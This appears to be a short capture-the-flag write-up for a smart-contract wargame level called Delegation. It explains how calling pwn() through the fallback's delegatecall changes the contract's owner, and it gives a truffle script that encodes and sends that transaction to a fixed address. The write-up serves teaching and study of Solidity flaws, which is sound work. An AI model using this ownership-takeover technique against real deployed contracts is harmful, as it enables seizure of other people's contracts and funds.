### Analysis
We just have to send function signature of pwn method of Delegate as msg.data to fallback so that code of Delegate is executed in the context of Delegation. That changes the ownership of Delegation.

### The Exploit
truffle script:
(tips:if don't set gaslimit in truffle script,it will show that "Although one or more Error Occurred [out of gas] Contract Execution Completed" )
~~~
module.exports = async function(callback) {
    const accounts = await web3.eth.getAccounts()
    player = accounts[1]
	delegation='0x6A2b56e310A1E2fEb8558870989EE57955fB2Adc'
	sig=web3.eth.abi.encodeFunctionCall({
		name:'pwn',
		type:'function',
        inputs:[]},
        []
	)
    console.log(player)
	console.log(await web3.eth.sendTransaction({from:player,to:delegation,data:sig,gasLimit: 100000}))
	callback();
}
~~~